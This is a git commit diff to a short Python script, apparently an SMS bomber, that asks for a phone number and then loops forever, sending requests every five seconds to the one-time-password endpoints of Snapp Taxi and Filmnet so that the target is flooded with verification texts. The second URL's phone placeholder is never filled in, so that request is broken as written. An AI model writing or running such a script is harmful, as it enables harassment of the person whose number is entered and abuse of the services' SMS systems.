75230fa8c1e39c56fb3f1d125bc529a0c7e0d3db
aliyazdani04 <98017374+aliyazdani04@users.noreply.github.com>
2022-04-13 02:03:48 +0430

    Update sms.py

--- sms.py
+++ sms.py
@@ -1,15 +1,18 @@
 import requests
 from termcolor import colored
+import time
 
-url = 'https://web.rubika.ir/assets/fonts/rbico.ttf'
+url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
+url1 = 'https://filmnet.ir/api-v2/access-token/users/{phonen}/otp'
 
 phonen = input('phone number: ')
 
 pnd = {'cellphone': f'{phonen}'}
 
 while True:
-
+      time.sleep(5)
       req = requests.post(url, json= pnd)
+      req1 = requests.get(url1)
 
       print(colored('yes', 'red'))
 
